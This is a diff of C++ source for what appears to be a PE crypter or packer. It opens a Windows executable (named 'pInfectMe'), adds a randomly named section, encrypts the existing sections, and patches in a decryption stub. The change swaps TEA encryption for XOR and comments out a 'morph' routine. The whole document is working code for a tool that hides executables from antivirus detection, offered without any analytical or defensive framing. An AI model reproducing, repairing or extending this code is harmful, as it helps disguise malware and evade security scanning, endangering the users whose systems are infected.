@@ -449,12 +449,12 @@ int main32(int argc, char *argv[])
 
 	pInfectMe->Load(argv[1]);
 
-	CPeAssembly *morph = NULL;
+	//CPeAssembly *morph = NULL;
 
-	if (argc > 3)
+	/*if (argc > 3)
 		morph = load_random(argv[3]);
 	else
-		morph = load_random(NULL);
+		morph = load_random(NULL);*/
 
 	// find patterns!
 	//PIMAGE_DOS_HEADER pInfectMe = (PIMAGE_DOS_HEADER) InternalLoadLibrary(argv[1], 0);
@@ -521,6 +521,14 @@ int main32(int argc, char *argv[])
 	for(int i =0; i < sizeof(passKey); i++)
 		passKey[i] = rand() % 256;
 
+
+	// test-
+	//char buffer[16] = {  0x8A, 0xA2, 0x41, 0x5D, 0x11, 0x10, 0x34, 0x12, 0x86, 0x2C, 0xA2, 0xBB, 0xF2, 0xF5, 0x66, 0x58 };
+
+	//memcpy(passKey, buffer, sizeof(buffer));
+
+	// test+
+
 	BYTE rc4sbox[256];
 	
 	
@@ -528,8 +536,10 @@ int main32(int argc, char *argv[])
 	
 	PIMAGE_SECTION_HEADER pDestSection = NULL;
 
+	// -test
 	char *szSectionName = szSectionNames[rand() % 15];
-	
+	//char *szSectionName = ".locals";
+	// test+
 	CPeSection *pInfectSection = NULL;
 
 	int newVirtualSize = RoundUp(pUnpackerCode->Misc.VirtualSize, 1024);// + ((rand() % 16) * 1024), 1024);
@@ -621,6 +631,15 @@ int main32(int argc, char *argv[])
 		{
 			uint32_t *key = (uint32_t *) rc4sbox;
 			memcpy(key, passKey, 16);
+
+			int z = 0;
+			while(rc4sbox[0] == 0)
+			{
+				rc4sbox[0] = rc4sbox[++z];
+			}
+
+			memset(key, rc4sbox[0], 16);
+			memset(passKey, rc4sbox[0], 16);
 		}
 
 		CPeSection *pProcessSection = pInfectMe->getSection(i);
@@ -640,8 +659,17 @@ int main32(int argc, char *argv[])
 				uint32_t *key = (uint32_t *) rc4sbox;
 				LPDWORD encptr = (LPDWORD) pProcessSection->RawData();
 
-				for(DWORD dwPtr = 0; dwPtr < pProcessSection->SizeOfRawData(); dwPtr += 8, encptr += 2)
-					tea_encrypt((uint32_t *) encptr, key);
+				DWORD size = pProcessSection->SizeOfRawData();
+
+				if (size > pProcessSection->VirtualSize())
+					size = pProcessSection->VirtualSize();
+
+				for(DWORD dwPtr = 0; dwPtr < size ; dwPtr += 8, encptr += 2)
+				{
+					encptr[0] ^= key[0];
+					encptr[1] ^= key[1];
+					//tea_encrypt((uint32_t *) encptr, key);
+				}
 			}
 
 			//pSectionHeader->Characteristics ^= IMAGE_SCN_MEM_EXECUTE;
@@ -662,8 +690,18 @@ int main32(int argc, char *argv[])
 				uint32_t *key = (uint32_t *) rc4sbox;
 				LPDWORD encptr = (LPDWORD) pProcessSection->RawData();
 
-				for(DWORD dwPtr = 0; dwPtr < pProcessSection->SizeOfRawData(); dwPtr += 8, encptr += 2)
-					tea_encrypt((uint32_t *) encptr, key);
+				DWORD size = pProcessSection->SizeOfRawData();
+
+				if (size > pProcessSection->VirtualSize())
+					size = pProcessSection->VirtualSize();
+
+				for(DWORD dwPtr = 0; dwPtr < size; dwPtr += 8, encptr += 2)
+				{
+					//tea_encrypt((uint32_t *) encptr, key);
+					encptr[0] ^= key[0];
+					encptr[1] ^= key[1];
+				}
+
 			}
 
 		}
@@ -762,8 +800,8 @@ int main32(int argc, char *argv[])
 	}
 	else
 	{	// process code for encryption of TEA
-		void *start = static_cast<void *>(&tea_decrypt);
-		void *end = static_cast<void *>(&tea_decrypt_end_marker);
+		void *start = static_cast<void *>(&xor_decrypt);
+		void *end = static_cast<void *>(&xor_decrypt_end_marker);
 		int size = static_cast<int>((int) end - (int) start);
 
 		char *encrypt = (char *) FindBlockMem((LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, start, size);
@@ -965,7 +1003,7 @@ int main32(int argc, char *argv[])
 		pInfectMe->Save(argv[1]);
 
 	delete pInfectMe;	// destroy and release memory!
-	delete morph;		// destroy and release memory!
+	//delete morph;		// destroy and release memory!
 
 	return 0;
 }
